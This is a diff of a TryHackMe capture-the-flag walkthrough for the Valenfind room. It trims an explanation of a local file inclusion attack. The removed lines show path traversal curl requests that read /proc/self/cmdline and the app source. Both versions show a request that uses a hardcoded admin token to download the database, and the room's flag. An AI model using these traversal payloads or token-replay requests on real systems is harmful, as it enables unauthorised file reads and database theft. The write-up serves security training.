@@ -6,7 +6,7 @@ https://tryhackme.com/room/lafb2026e10
 
 <img width="924" height="717" alt="image" src="https://github.com/user-attachments/assets/15436140-b246-4e5c-b5dc-e367e8b2cd88" />
 
-The room already provided the web application URL, and I noticed that the application was running on port `5000`. I started by opening the website to see what functionality was available.
+The room already provided the web application URL, and I noticed that the application was running on port 5000. I started by opening the website to see what functionality was available.
 
 <img width="1891" height="531" alt="image" src="https://github.com/user-attachments/assets/e92b772a-f438-4054-840f-85444f2b5ab9" />
 
@@ -109,77 +109,21 @@ def export_db():
 
 <img width="974" height="267" alt="image" src="https://github.com/user-attachments/assets/ad7225f9-dae5-437a-9aab-c79bcb25a74b" />
 
+## Database Extraction
 
----------------------
+The source code revealed an endpoint at `/api/admin/export_db` that allowed the entire database to be downloaded. Access to the endpoint was protected by the `X-Valentine-Token` header, but the required token had already been exposed in the application source code.
 
-Use /proc/self/cmdline to Find the App's Location
-You have arbitrary file read, but you don’t know where the web application’s source code lives on the server. Here’s a Linux trick that solves that instantly.
+Using the recovered API key, I requested the database export:
 
-
-The /proc filesystem is a virtual filesystem that exposes live information about running processes. /proc/self refers to the current process — in this case, the Python web server serving your requests. Inside it, cmdline contains the exact command used to launch the process.
-
-```
-$ curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../proc/self/cmdline -O 
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100    39  100    39    0     0    598      0 --:--:-- --:--:-- --:--:--   600
-death@esther:~$ cat fetch_layout 
-/usr/bin/python3/opt/Valenfind/app.py
-```
-we can do same things on burp if u prefer burp
-
-<img width="1222" height="277" alt="image" src="https://github.com/user-attachments/assets/78751324-cd19-4c61-b504-feff06f16f9c" />
-
-Why this matters: You’re asking the server “how were you started?” and it answers honestly, giving you the full path to the application’s entry point. Now you have a precise target for your next read.
-
-The app lives at /opt/Valenfind/app.py.
-```
-curl http://10.48.151.100:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py
-```
-
-<img width="1086" height="562" alt="image" src="https://github.com/user-attachments/assets/ddbb9ed6-1c5b-4c1a-ac9a-41103fba7eb7" />
-
-<img width="1521" height="530" alt="image" src="https://github.com/user-attachments/assets/a1efa4d3-7acd-416a-93bb-599a7dacc48b" />
-
-The server returns the complete Python source code. Read it carefully. Near the top:
-```
-ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
-DATABASE      = 'cupid.db'
-```
-Hardcoded. Right there. And further down, the admin export endpoint:
-```
-@app.route('/api/admin/export_db')
-def export_db():
-    auth_header = request.headers.get('X-Valentine-Token')
-    if auth_header == ADMIN_API_KEY:
-        try:
-            return send_file(DATABASE, as_attachment=True,
-                             download_name='valenfind_leak.db')
-        except Exception as e:
-            return str(e)
-    else:
-        return jsonify({"error": "Forbidden",
-                        "message": "Missing or Invalid Admin Token"}), 403
-```
-<img width="974" height="267" alt="image" src="https://github.com/user-attachments/assets/ad7225f9-dae5-437a-9aab-c79bcb25a74b" />
-
-
---------------
-
-There’s an endpoint at /api/admin/export_db that downloads the entire database — but only if you send the correct X-Valentine-Token header. You now have exactly that token.
-
-The real-world lesson: Hardcoding secrets in source code is a critical vulnerability. Once an attacker can read your code (via LFI, exposed repos, or misconfigured servers), all your internal secrets are exposed. Always use environment variables or a secrets manager.
-
-## Download the Database and Extract the Flag
-Use curl to call the export endpoint with the admin token:
-
-```
+```bash
 curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
      http://MACHINE_IP:5000/api/admin/export_db \
      -o valenfind.db
 ```
-Open it with sqlite3:
-```
+
+Once the database was downloaded, I opened it with SQLite and inspected the available tables:
+
+```bash
 sqlite3 valenfind.db
 sqlite> .tables
 users
@@ -188,9 +132,24 @@ sqlite> SELECT * FROM users;
 
 <img width="1905" height="576" alt="image" src="https://github.com/user-attachments/assets/23cea032-7ad3-4d48-986d-adcd0c9805b6" />
 
-Flag
-```
+Reviewing the contents of the database revealed the room flag.
+
+## Flag
+
+```text
 THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
 ```
+
 <img width="849" height="386" alt="image" src="https://github.com/user-attachments/assets/45cce556-d9c6-4c69-bbee-a7f66b54dcb8" />
 
+## Conclusion
+
+Valenfind was a short and enjoyable room focused on identifying a Local File Inclusion vulnerability and using it to read sensitive files from the server. By leveraging the file read primitive, I was able to locate the application's source code, recover a hardcoded administrative API key, and ultimately export the database to obtain the flag.
+
+Thanks for reading.
+
+For more TryHackMe walkthroughs and cybersecurity content:
+
+Medium: https://deathesther.medium.com/
+
+GitHub: https://github.com/Esther7171/TryHackMe-Walkthroughs
